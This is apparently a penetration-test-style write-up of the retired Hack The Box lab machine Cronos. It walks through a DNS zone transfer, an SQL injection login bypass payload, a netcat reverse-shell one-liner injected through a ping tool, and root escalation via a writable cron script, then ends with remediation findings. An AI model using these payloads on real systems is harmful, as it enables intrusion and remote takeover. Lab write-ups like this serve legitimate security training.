# HTB Cronos - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-11

---

## 0. Lesson Learned

If a site appears empty or shows a default page, it is often necessary to guess potential domain names and add them to the hosts file.

Remember, different databases and applications handle SQL comments differently. So test multiple comment syntaxes such as `-- -`, `#`, or `/* */`.

---

## 1. Executive Summary

A penetration test was conducted against the target host to identify potential security vulnerabilities. During the assessment, multiple critical weaknesses were discovered, including a DNS zone transfer misconfiguration, SQL injection in a web login portal, command injection within a network diagnostic tool, and a privilege escalation vulnerability involving a writable Laravel artisan file executed by a cron job.

By exploiting these vulnerabilities, an attacker was able to enumerate internal domains, bypass authentication, execute system commands through the web interface, and obtain a reverse shell as the www-data user. Further enumeration revealed database credentials and a misconfigured cron job running as root. By replacing the Laravel artisan script with a reverse shell payload, the attacker obtained root-level access, resulting in full compromise of the system.

---

## 2. Scope

- **Target:** 10.129.227.211
- **Environment:** HTB Cronos (Retired Machine)
- **Testing Window:** 2026-3-11
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-scan was conducted with Nmap:

```
nmap -p- -sCV 10.129.227.211 -T4 -oA cronos_tcp
```

Revealing the following services:

- 22/tcp - SSH - OpenSSH 7.2p2
- 53/tcp - DNS - ISC BIND 9.10.3-P4
- 80/tcp - HTTP - Apache httpd 2.4.18

The HTTP service presented an Apache default page that changed to a custom site after adding `cronos.htb` to the hosts file:

```
nano /etc/hosts

10.129.227.211  cronos.htb
```

---

## 5. Enumeration

A DNS zone transfer attempt was conducted against the DNS server:

```
dig axfr @10.129.227.211 cronos.htb
```

This revealed the subdomain `admin.cronos.htb` that was also added to the hosts file:

```
nano /etc/hosts

10.129.227.211  cronos.htb  admin.cronos.htb
```

Navigating to `admin.cronos.htb` revealed a login portal.

---

## 6. Initial Access

Testing the login form revealed a SQL injection vulnerability in the username field:

```
' or 1=1;--
```

This payload failed, but the following payload successfully bypassed authentication:

```
'or 1=1#
```

This granted access to the administrative interface containing a network diagnostic tool allowing the execution of ping.

Traceroute commands were blocked, but ping commands were allowed and verified by monitoring ICMP traffic on the attacker machine:

```
tcpdump -ni tun0 icmp
```

A reverse shell was injected through the vulnerable command execution field:

```
10.10.14.7; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.7 443 >/tmp/f
```

Listener started on the attacker machine:

```
nc -lnvp 443
```

This provided a shell as the www-data user.

---

## 7. Post-Exploitation

Database credentials were discovered in the `/var/www/admin/config.php` file:

```
admin : kEjdbRigfBHUREiNSDs
```

Network and process enumeration confirmed MySQL running locally:

```
netstat -tunlp
```

MySQL was accessed using the recovered credentials:

```
mysql -u admin -p

kEjdbRigfBHUREiNSDs
```

Databases were enumerated:

```
SHOW DATABASES;

USE admin;

SHOW TABLES;

SELECT * from users;
```

Retrieving the hash:

```
admin : 4f5fffa7b2340178a716e3832451e058
```

The hash could not be cracked.

---

## 8. Privilege Escalation

Cron jobs were inspected:

```
cat /etc/crontab
```

A cron job was discovered executing a Laravel Artisan script:

```
cat /var/www/laravel/artisan
```

The file was writable by the current user and replaced with a Pentestmonkey PHP reverse shell:

```
cd /var/www/laravel

mv artisan artisan.old
```

The reverse shell payload was placed in the new `artisan` file.

Listener started:

```
nc -lnvp 443
```

When the cron job executed, a root reverse shell was obtained.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
cat /home/noulis/user.txt
```

**Root Flag**: *REDACTED*

```
cat /root/root.txt
```

The system was fully compromised with root privileges.

---

## 10. Findings & Recommendations

### **Finding:** DNS Zone Transfer Enabled

**Severity:** High

**Description:**
The DNS server permitted unauthenticated zone transfers, allowing attackers to retrieve the full list of DNS records for the domain.

**Impact:**
Attackers could enumerate internal hosts, services, and infrastructure components, aiding further reconnaissance and potential lateral movement.

**Recommendation:**
Restrict zone transfers to trusted DNS servers only and configure the DNS server to deny unauthorized transfer requests.

### **Finding:** SQL Injection Vulnerability

**Severity:** Critical

**Description:**
The application login form was vulnerable to SQL injection, allowing attackers to manipulate backend database queries.

**Impact:**
Attackers could bypass authentication controls, retrieve sensitive data, or modify database contents.

**Recommendation:**
Use prepared statements and parameterized queries, implement input validation, and avoid directly embedding user input in SQL queries.

### **Finding:** Command Injection

**Severity:** Critical

**Description:**
A web-based diagnostic tool executed system commands using unsanitized user input.

**Impact:**
Attackers could execute arbitrary commands on the server, potentially leading to full system compromise.

**Recommendation:**
Validate and sanitize user input, avoid passing user input directly to system command execution functions, and restrict commands to predefined safe operations.

### **Finding:** Insecure Cron Job Privilege Escalation

**Severity:** Critical

**Description:**
A cron job executed a script that was writable by a lower-privileged user.

**Impact:**
Attackers could modify the script to execute arbitrary commands with root privileges.

**Recommendation:**
Ensure scripts executed by privileged cron jobs are owned by root and not writable by other users.

---

## 11. Appendix

MySQL Enumeration Cheatsheet - 
[https://hackviser.com/tactics/pentesting/services/mysql](https://hackviser.com/tactics/pentesting/services/mysql)

MySQL Commands Cheatsheet -
[https://devhints.io/mysql](https://devhints.io/mysql)